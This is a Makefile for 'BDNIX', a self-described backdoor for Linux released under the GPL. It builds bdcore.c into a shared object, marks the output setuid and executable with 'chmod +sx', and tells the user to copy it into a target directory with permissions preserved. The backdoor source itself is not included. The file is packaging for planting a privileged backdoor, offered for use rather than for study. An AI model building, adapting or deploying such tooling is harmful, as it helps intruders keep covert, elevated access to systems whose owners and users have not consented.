#    Trivial userspace backdoor 
#    Copyright (C) 2012  Emanuele Paiano
#        nixw0rm@gmail.com
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.


# BDNIX - simple backdoor for linux
#

CC=gcc
OUTPUT=libbd.so
CHMOD=chmod

all: chk bdcore

chk: 
	@chmod +x compile
	@chmod +x check
	@./check

bdcore: chk
	$(CC) bdcore.c -o $(OUTPUT)
	$(CHMOD) +sx $(OUTPUT)
	@echo "Done. Now copy with 'cp -p $(OUTPUT) <target_dir>' "  

clean:
	rm -f $(OUTPUT)

help:
	@echo 'Use: # make <command>'
	@echo 'where command is:'
	@echo 'help: this help'
	@echo 'clean: remove build and clean source'
	@echo 'all: create binary files'
